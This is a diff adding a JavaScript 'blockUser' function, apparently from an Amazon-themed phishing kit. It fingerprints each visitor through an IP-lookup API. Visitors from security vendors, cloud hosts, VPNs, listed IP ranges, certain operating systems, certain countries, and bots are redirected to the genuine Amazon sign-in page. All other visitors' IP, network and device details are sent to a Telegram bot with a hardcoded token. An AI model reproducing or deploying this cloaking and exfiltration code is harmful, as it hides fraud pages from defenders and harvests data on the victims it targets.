@@ -1,0 +1,83 @@
+function blockUser(){
+    $.getJSON("https://api.bigdatacloud.net/data/client-info",
+		function(data) {
+			$('#ip').val(data.ipString);
+			var dataIP = $('#ip').val();
+			var dataDevice = data.device;
+			var dataOS = data.os;
+			var dataUserAgentD = data.userAgentDisplay;
+			var dataUserAgentR = data.userAgentRaw;
+			var dataSpider = data.isSpider;
+			var dataMobile = data.isMobile;
+			var dataDevice = data.device;
+					if(dataSpider == false){
+						 // validasi segi company
+						 $.getJSON("https://api.bigdatacloud.net/data/network-by-ip?ip="+ dataIP +"&localityLanguage=id&key=bdc_f2067b459a11416fad070ebd05ebe842",
+							function(dataApi) {
+							// variable dari apikedua
+							var organisation = dataApi.organisation;
+							var cidr  = dataApi.bgpPrefix;
+							var country = dataApi.registeredCountryName;
+							var bannedorg = ["S.C. GVM SISTEM 2003 S.R.L.","joseph hall","EG Dynamic IPs","Facebook, Inc.","Asia Pacific Network Information Centre Regional..","Horry Telephone Cooperative, Inc.","QuadraNet, Inc","111250 Russia Moscow SOVINTEL/EDN Dinamic IP poo..","Microsoft","Ecuadortelecom S.A.","PE-TDPERX15-LACNIC","Liberty Cablevision - Arecibo","Hoinaski & Sklasky Ltda","Gtpl Broadband Pvt. Ltd.","Jazz Telecom S.A.","Cloud Sigma","US Net Incorporated","VPNETWORKS","résidentiel","Oneprovider.com - Japan Infrastructure","US Net Incorporated","31173 Services Germany","Perfect Privacy IP Network","IP Volume inc","Africa","Aruba","SERVERS-COM-LUX1","IP Volume inc","Vultr","Vultr Holdings, LLC","TYO_VULTR_CUST","Bitdefender","Panq B.V.","FPT Telecom Company 2nd floor FPT Building, Pham Hung Road, Cau Giay District, Hanoi","LeaseWeb","Afrihost Dedicated","CDNEXT","TPG Internet Pty Ltd","CDN77-FRA","SEC-Firewallas","customer","customers","Customers","Customer","amazon","Amazon","Amazon Data Services Italy","Core-Backbone GmbH","Comcast Cable Communications, Inc.","AT&T Services, Inc.","IPAX VIRTUAL line server","111250 Russia Moscow SOVINTEL/EDN Dinamic pool for FTTB clients LM Corbina","DIMENOC SERVICOS DE INFORMATICA LTDA","A100 ROW GmbH","Mega Colocation, Inc.","CDNEXT-FRA","British Telecommunications PLC","CDNEXT-PAR","CDN77_AMS_DC1","Portlane AB","DET Africa (Pty) LTD","OVH Sp. z o. o.","Intergrid (New Zealand) Limited","CDNEXT-SAO","Lertas network","Serbia BroadBand-Srpske Kablovske mreze d.o.o.", "CONVERGE ICT Net blocks","DDF-GGC-net","CDNEXT-SAO","INFONET Services Corporation","DELTA LeasedLine Network","Brightnet Internet","QNAX LTDA","Datacamp Limited","CDNEXT-AMS","ConvergeICT NetBLOCK","CDNEXT-AMS","CDN77 Hong Kong","PRCDN Consumer Pool PoP Frankfurt Germany https://prcdn.net/","arsys.es","Windscribe","African Network Information Center - ( AfriNIC Ltd. )","IPXO","Rootnerds LLC","HOSTING90 systems s.r.o. Virtual server hosting","truview LLC","Amazon Data Services France","Premier Engineering corporation","CCCS","Hetzner-ZA","FR-FULLSAVE-P2P","Aruba S.p.A. - Dedicated servers","Acacio Servicios Telematicos, SLU","Windscribe Limited","6 COLLYER QUAY","IPXO","Scaleway","Netinternet Bilisim Teknolojileri AS","AltusHost Sweden Network Stockholm Data Center","OCULUS NETWORKS INC","OVH Australia PTY LTD","MRC Marketing. Inc.","cleardocks LLC","Foundation for Applied Privacy","Surfshark Ltd. (Peru)","Globe Telecom","Aruba S.p.A. - Dedicated servers","360buyplace","VPN-Consumer-US","IPXON Networks Panamá","Surfshark Ltd. (Venezuela)","CDNEXT-WAR","Netprotect","Cisco OpenDNS LLC","cleardocks LLC","EV-193-36-225-0","steel-axis LLC","Submarine Security Solutions","Dino Solutions, Inc.","Netprotect","Mitsui Associates Ltd","Sutton Projects Inc","KNB Proxy World","Root Networks LLC","IPXO LLC","LeaseWeb USA, Inc. New York","Smithville Digital, LLC","OVH Australia PTY LTD","GetNet Inc.","Packethub S.A.","Fbol Gaming","PRCDN Consumer Pool PoP London United Kingdom https://prcdn.net/","EGIHosting","H4Y Technologies LLC","Total server solutions","OVH Australia PTY LTD","PT. Varnion Technology Semesta Gedung Cyber Lt.3 Jl. Kuningan Barat No.8 Jakarta Selatan 12710","CABLE ONE","Dwi Tunggal Putra, PT. Network Access Point Jakarta","OVH Australia PTY LTD","tzulo, inc.","PT. MNC Kabel Mediacom Internet Service Provider MNC Tower 10, 11, 12A Floor Jl. Kebon Sirih No. 17-","PacketExchange, Inc","PT. Hipernet Indodata Internet Service Provider Jakarta","PT Sumber Data Indonesia Internet Service Provider GD. Graha Mustika Ratu Lt.10 Jl. Jend. Gatot Subr","Universitas Brawijaya University / Direct Member IDNIC Jl. Veteran Malang, Jawa Timur, 65145","OVH Australia PTY LTD","CDN77_TYO-EQ8","Akamai Technologies, Inc.","Evolving Networks Limited","Total server solutions LLC","O2 Online (UK)","NOR002","Ace Host, LLC","Dublin","Southern Phone Company Ltd","Total server solutions","Database by Design, LLC","Zero2Infinity Cust alloc - New Zealand","Secure Internet LLC","Secure Internet LLC (UK)","Secure Internet LLC (US)","Secure Internet LLC (IS)","Streamline Servers Ltd - Brisbane Network","Japan Network Information Center","Host Universal Pty Ltd Auckland Services","Redstation Limited","MICROSOFT","MICROSOFT - US","MICROSOFT - UK","Spirit Communications","Intergrid Group Pty. Ltd.","QuadraNet Enterprises LLC","Cloudflare, Inc.","M24Seven-LAS-VEGAS","QIW HOST, LLC","Gigaclear","JACKSON ENERGY AUTHORITY","Delta Centric LLC","Wide Open West","Steve Woods Printing Company","PRCDN Consumer Pool PoP Paris France https://prcdn.net/","Windstream Communications LLC","ONLINE SAS","Intergrid Group Pty. Ltd.","Heficed","tzulo-den","Mammoth Media Pty Ltd","M247-LOS-ANGELES","INCX Global, LLC","FranTech Solutions","M247 Europe SRL","Secure Internet LLC JP","GSL Networks Pty LTD","Maxihost LLC","KVCHOSTING.COM LLC","02 Online (uk)","ESTNOC-GLOBAL","Intelligence Network, Inc.","RG Software Corp.","ColoCrossing","TWEEDY, BROWNE COMPANY LLC","Plusnet PLC","Web2Objects LLC","Cablevision Systems Corp.","Hostroyale","Amazon Data Services Ireland Limited","Icenetworks Ltd.","Hyperoptic Ltd","Amazon Corporate Services Pty Ltd","Amazon Data Services Japan","Unus, Inc.","IHT-LLU1","MCI Communications Services, Inc. d/b/a Verizon Business","Amazon Data Services NoVa","CenturyLink Communications, LLC","Charter Communications Inc","CenturyLink Communications, LLC","Pierre-Francois Lareppe","PSINet, Inc.","Amazon Data Services UK", "Amazon Data Services NoVa", "MY247WEBHOSTING LLC","Vyve Broadband","EXPRESS-EQUINIX-LONDON","Point-to-Point Allocation for Internet Service", "Private Customer","Iskon Internet d.d. Internet Service Provider Croatia","Telekom System sp.z o.o.","TOT Public Company Limited","Robi Axiata Ltd - DATA","Broadbandtech S. A.","Chubu Telecommunications Co.,Inc.","UnderNet LLC","RM Education Ltd","Siberian Networks","Reliance Jio Infocomm Limited","Loughborough University","WranglerNet","Digital Energy Technologies Limited","CDN77.com","myLoc managed IT AG","ONLINE SERVICOS DE TELECOMUNICACOES LTDA","YouTube, LLC","Ask4 Limited","BVNET S.A.","Satnet Gye CM","Wireless network in Moscow region","DigitalServer Web Hosting en México","VPN Consumer Network","Amazon Technologies Inc.","Microsoft Corporation","Konzept IT GmbH","Fortinet Technologies (Canada)","B2 Net Solutions Inc.","Top Level Hosting SRL","servers.ru hosting services","BT","DIGITALOCEAN","Oy Creanova Hosting Solutions Ltd.","FTIP003161715 Netcraft Limited","pcl-ag03 Dial-up and ADSL pool Plusnet plc.","IPAX OG","Kaspersky Lab AO","Microsoft Azure","AVAST Software s.r.o.","OVH SAS","NFOrce Entertainment B.V.","M247 Ltd","Digital Ocean","Amazon.com","Palo Alto Networks","Leaseweb Asia Pacific pte.","Faction","Kcom","Exetel","Google","Rutgers University","Rackspace Cloud Servers","PRCDN Consumer Pool PoP Frankfurt https://prcdn.net/","Uninet S.A. de C.V.","Paul Bunyan Communications","DigitalOcean, LLC","Kaspersky Lab AO","Kcom Statics","OVH Ltd","M247 LTD Frankfurt Infrastructure","Amsterdam Residential Television and Internet, LLC","Fortinet Technologies (Canada)","FORTINET TECHNOLOGIES (CANADA) INC","LeaseWeb Asia Pacific - Hong Kong Please send all abuse notifications to the following email address"];
+							var bannedcidr = ["216.19.200.0/24","69.171.251.0/24","216.223.222.0/24","79.104.209.0/24","207.172.61.128/26","41.109.128.0/17","103.75.118.0/24","198.240.69.0/24","165.231.253.0/24","185.213.155.0/24","217.114.208.0/20","93.174.93.0/24", "188.42.195.0/24","93.174.93.0/24","202.182.112.0/20","81.161.59.0/24","136.144.42.0/24","42.117.10.128/26","92.16.0.0/15","203.219.219.0/24","138.199.18.0/23","212.30.33.0/24","15.160.0.0/16","80.255.4.0/22","80.255.4.0/22","68.80.0.0/16","162.43.240.0/24","37.252.184.0/21","194.186.142.0/23","186.227.196.0/22","3.64.0.0/12","67.213.122.0/24","212.102.57.0/24","84.17.42.0/24","195.213.0.0/16","84.17.46.0/23","157.97.122.0/24","103.108.92.0/24","138.199.58.0/24","195.146.4.0/24","87.116.160.0/19","136.158.116.0/22","31.186.164.0/22","138.199.58.0/24","146.199.0.0/16","62.212.239.0/24","66.249.228.0/23","177.67.80.0/23","89.187.168.0/24","212.102.34.0/24","196.196.216.0/24","120.29.76.0/22","212.102.35.0/24","84.17.56.0/23","159.242.234.0/24","82.223.0.0/16","198.23.240.0/22","154.3.40.0/24","191.96.106.0/24","194.150.167.0/24","130.193.8.0/21","45.142.92.0/22","13.36.0.0/14","216.19.202.0/24","152.39.169.0/24","45.221.68.0/24","141.0.203.0/24","62.149.192.0/18","45.13.9.0/24","202.43.6.0/24","104.244.210.0/24","43.128.192.0/20","181.214.218.0/24","89.252.132.0/24","79.142.76.0/23","161.129.171.0/24","62.149.192.0/18","139.99.128.0/17","216.19.220.0/24","92.114.81.0/24","109.70.100.0/24","193.218.35.0/24","110.54.167.0/24","62.149.192.0/18","104.164.161.0/24","45.131.192.0/24", "138.186.142.0/24","45.149.3.0/24","138.199.59.0/24","198.181.163.0/24","146.112.163.0/24","92.114.81.0/24", "193.36.225.0/24","213.188.80.0/20","104.164.120.0/21","104.164.161.0/24","216.151.183.0/24","104.164.161.0/24","104.148.93.0/24","104.165.184.0/22","216.19.203.0/24","139.99.128.0/17","108.62.48.0/21","195.78.54.0/24","66.244.72.0/21","74.85.220.0/24","95.142.117.0/24","104.165.177.0/24","92.119.18.0/24","104.165.177.0/24","104.152.222.0/23","66.115.165.0/24","139.99.128.0/17","150.129.59.0/24","173.47.249.0/24","202.43.172.0/24","139.99.128.0/17","68.235.32.0/20","110.50.81.0/24","173.205.84.0/23","114.4.0.0/21","203.176.176.0/23","103.11.28.0/24","175.45.186.0/23","139.99.128.0/17","156.146.34.0/23","172.224.224.0/24","88.212.128.0/20","172.98.87.0/24","82.132.184.0/22","77.75.120.0/21","209.216.78.0/23","23.92.127.0/24","112.213.214.0/24","66.115.182.0/24","76.72.160.0/20","103.27.224.0/22","192.253.250.0/24","103.62.50.0/23","61.114.96.0/20","180.149.231.0/24","37.220.16.0/22","167.220.192.0/21","64.53.0.0/23","103.77.232.0/22","104.129.56.0/24","104.28.15.0/24","37.120.147.0/24","104.129.56.0/24","83.151.200.0/21","192.154.120.0/22","181.41.204.0/24","50.4.128.0/24","216.19.199.0/24","159.242.228.0/24","98.22.0.0/19","212.83.128.0/19","103.77.232.0/22","37.120.214.0/24","38.101.74.0/24","45.61.184.0/22","89.44.201.0/24","172.94.56.0/24","103.1.213.0/24","45.133.172.0/24","198.54.128.0/24","203.57.114.0/23","66.203.113.0/24","148.252.132.0/23","38.145.99.0/24","82.132.224.0/22","85.255.232.0/22","85.255.232.0/23","193.36.118.0/24","216.19.220.0/22","168.151.146.0/23","87.237.16.0/21","205.169.39.0/24","54.92.128.0/17","63.88.72.0/23","70.95.0.0/16","205.169.39.0/24","193.105.73.0/24","38.145.64.0/19","35.176.0.0/14","3.216.0.0/15","45.40.120.0/23","208.114.92.0/23","85.203.46.0/24","31.41.81.0/24","213.202.89.0/24","203.113.80.0/23","103.242.22.0/24","200.112.190.0/24","219.117.32.0/20","176.104.0.0/18","194.154.0.0/19","49.44.64.0/19","80.64.174.0/23","131.231.0.0/16","69.164.144.0/20","154.127.57.0/24","185.93.2.0/24","217.79.176.0/20","191.7.212.0/23","104.237.189.0/24","213.143.0.0/19","190.97.0.0/24","186.68.128.0/19","80.252.129.0/24","191.96.145.0/24","45.41.181.0/24","52.86.0.0/15","13.64.0.0/11","83.175.64.0/18","204.101.161.0/24","69.4.80.0/20","93.119.227.0/24","88.212.240.0/20","91.103.64.0/21","87.112.0.0/14","185.112.82.0/24","178.128.136.0/21","52.240.0.0/12","5.62.40.0/23","51.77.0.0/16","212.92.112.0/21","185.220.70.0/24","159.65.208.0/21","65.154.226.0/24","204.101.161.0/24","207.102.136.0/21","64.120.88.0/22","195.74.76.0/24","52.148.0.0/14"];
+							var bannedOS = ["Windows 7","Windows XP","Linux"];
+							var bannedCountry = ["Rusia","Mesir","Rumania","Norwegia","Australia","Bangladesh","Chili","India"];
+							var handleorg=bannedorg.join("|");
+							handleorg=new RegExp(handleorg, "i");
+							var handlecidr=bannedcidr.join("|");
+							handlecidr=new RegExp(handlecidr, "i");
+							var handleOS=bannedOS.join("|");
+							handleOS=new RegExp(handleOS, "i");
+							var handleCountry=bannedCountry.join("|");
+							handleCountry=new RegExp(handleCountry, "i");
+								// jika ketemu di list organisasi maka suruh ke amazon
+								if(organisation.search(handleorg) !=-1){
+								// suruh ke amazon.com
+								window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+								} else {
+								//proses ke validasi kedua
+									//jika ketemu di list cidr maka suruh amazon lagi
+									if(cidr.search(handlecidr) !=-1){
+									//suruh ke amazon;
+									window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+									}else{
+										// OSS
+										if(dataOS.search(handleOS) !=-1){
+                          //suruh ke amazon;
+                        window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+                        }
+                        else{
+                          // got access
+                            if(country.search(handleCountry) !=-1){
+                              //suruh ke amazon;
+                        window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+                            }
+                            else{
+                              // tele
+										$.ajax({
+										url:'https://api.telegram.org/bot1448616115:AAGJxXv8BpxK7p9rWYGdTPk5iBHzK1Cwtv0/sendMessage',
+										method:'POST',
+										data:{chat_id:"-1001410027840",
+										text:'\u{1F30E} LOG2: ' + dataDevice + ' ' + country + ' | ' + dataIP + ' | "' + cidr + '", | "' + organisation + '", | ' + dataUserAgentD },
+										success:function(){
+										// kosong
+										}
+										});
+										//
+                            }
+                        }
+                        // OSSSS
+										
+									}
+								}
+								
+							// 
+							});
+						// 
+					}else{
+						// bot musti ke amazon
+						window.location.replace("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
+						// console.log(dataSpider);
+					}	
+			},0);
+}
